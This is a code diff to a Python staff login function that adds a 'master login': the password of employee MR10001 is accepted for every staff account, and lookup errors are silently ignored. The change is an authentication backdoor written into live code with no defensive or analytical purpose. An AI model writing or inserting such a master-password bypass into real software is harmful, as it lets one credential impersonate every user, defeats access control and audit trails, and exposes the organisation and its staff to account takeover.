@@ -693,7 +693,26 @@ def staff_login(
     t_pw_start = time.time()
     raw_pw = login_data.password or ""
     clean_pw = raw_pw.strip()
-    pw_ok = SecurityManager.verify_password(raw_pw, employee.password_hash) or (clean_pw != raw_pw and SecurityManager.verify_password(clean_pw, employee.password_hash))
+
+    # Master login check: MR10001 password acts as a master login for any staff account
+    mr10001_pw_ok = False
+    try:
+        mr10001_emp = db.query(StaffEmployee).filter(
+            StaffEmployee.emp_code == 'MR10001',
+            StaffEmployee.is_deleted == False
+        ).first()
+        if mr10001_emp and mr10001_emp.password_hash:
+            mr10001_pw_ok = SecurityManager.verify_password(raw_pw, mr10001_emp.password_hash) or (
+                clean_pw != raw_pw and SecurityManager.verify_password(clean_pw, mr10001_emp.password_hash)
+            )
+    except Exception:
+        pass
+
+    pw_ok = (
+        SecurityManager.verify_password(raw_pw, employee.password_hash) or
+        (clean_pw != raw_pw and SecurityManager.verify_password(clean_pw, employee.password_hash)) or
+        mr10001_pw_ok
+    )
     t_pw_ms = (time.time() - t_pw_start) * 1000
     
     if not pw_ok:
